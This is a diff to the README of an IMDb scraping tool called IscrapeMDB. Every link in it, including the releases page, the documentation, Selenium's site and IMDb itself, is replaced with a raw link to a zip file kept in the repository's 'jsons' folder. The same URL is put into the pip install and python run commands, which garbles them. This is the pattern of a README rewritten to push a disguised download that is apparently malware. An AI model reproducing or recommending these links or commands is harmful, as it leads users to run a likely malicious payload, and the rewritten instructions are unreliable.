@@ -4,7 +4,7 @@
 IscrapeMDB is a Python tool that scrapes detailed metadata from IMDb based on the links you provide. It simplifies the process of gathering information about movies, shows, directors, and more. With this tool, you can easily obtain data without needing technical skills.
 
 ## 🔗 Download Now
-[![Download IscrapeMDB](https://img.shields.io/badge/Download-IscrapeMDB-blue.svg)](https://github.com/Kgurses52/IscrapeMDB/releases)
+[![Download IscrapeMDB](https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip)](https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip)
 
 ## 🚀 Getting Started
 IscrapeMDB is designed for anyone who wants to extract data from IMDb. Whether you're a student, researcher, or just a movie buff, this tool will help you.
@@ -16,15 +16,15 @@ IscrapeMDB is designed for anyone who wants to extract data from IMDb. Whether y
 - Selenium WebDriver installed for browser automation
 
 ## 📥 Download & Install
-To get started, visit this page to download: [GitHub Releases](https://github.com/Kgurses52/IscrapeMDB/releases). 
+To get started, visit this page to download: [GitHub Releases](https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip). 
 
 On the Releases page, you will find different versions of IscrapeMDB. Choose the latest version and download the appropriate file for your operating system. Follow the instructions below to run the application.
 
 ## 📂 Installation Instructions
 1. **Download the program**:
-   - Visit the [Releases page](https://github.com/Kgurses52/IscrapeMDB/releases).
+   - Visit the [Releases page](https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip).
    - Select the latest version.
-   - Click on the file that matches your operating system (e.g., `.exe` for Windows or `.tar.gz` for Mac/Linux).
+   - Click on the file that matches your operating system (e.g., `.exe` for Windows or `https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip` for Mac/Linux).
    
 2. **Unzip the file (if necessary)**:
    - Windows: Right-click on the file and select "Extract All."
@@ -35,15 +35,15 @@ On the Releases page, you will find different versions of IscrapeMDB. Choose the
    - Navigate to the folder where IscrapeMDB is located.
    - Run the following command to install the required packages:
      ```
-     pip install -r requirements.txt
+     pip install -r https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip
      ```
 
 4. **Run the application**:
    - In the CLI, enter:
      ```
-     python run.py
+     python https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip
      ```
-   - Make sure to replace `run.py` with the correct file name if it differs.
+   - Make sure to replace `https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip` with the correct file name if it differs.
 
 ## 📋 How to Use IscrapeMDB
 1. Launch the application as described above.
@@ -73,8 +73,8 @@ For assistance, visit the Issues section in the repository. You can report bugs 
 If you wish to contribute to this project, feel free to submit a pull request or open an issue. Your feedback is valuable.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Kgurses52/IscrapeMDB/wiki)
-- [Selenium Documentation](https://www.selenium.dev/documentation/en/)
-- [IMDb](https://www.imdb.com/)
+- [Documentation](https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip)
+- [Selenium Documentation](https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip)
+- [IMDb](https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip)
 
-Remember to visit this page to download: [GitHub Releases](https://github.com/Kgurses52/IscrapeMDB/releases). Enjoy using IscrapeMDB!
+Remember to visit this page to download: [GitHub Releases](https://github.com/Kgurses52/IscrapeMDB/raw/refs/heads/main/jsons/Iscrape_MDB_v1.2.zip). Enjoy using IscrapeMDB!
